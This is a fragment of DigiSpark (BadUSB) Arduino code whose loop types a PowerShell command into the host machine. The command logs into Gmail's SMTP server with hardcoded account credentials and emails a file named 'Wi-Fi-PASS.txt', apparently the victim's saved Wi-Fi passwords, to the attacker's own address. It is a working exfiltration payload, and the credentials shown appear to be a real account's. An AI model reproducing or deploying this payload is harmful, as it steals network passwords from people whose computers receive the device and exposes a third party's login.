...
void loop() {
  ...
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);  
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('eliasbalinbin808@gmail.com', 'Lazerman808'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'eliasbalinbin808@gmail.com'; $ReportEmail.To.Add('eliasbalinbin808@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('Wi-Fi-PASS.txt'); $SMTPInfo.Send($ReportEmail)"));
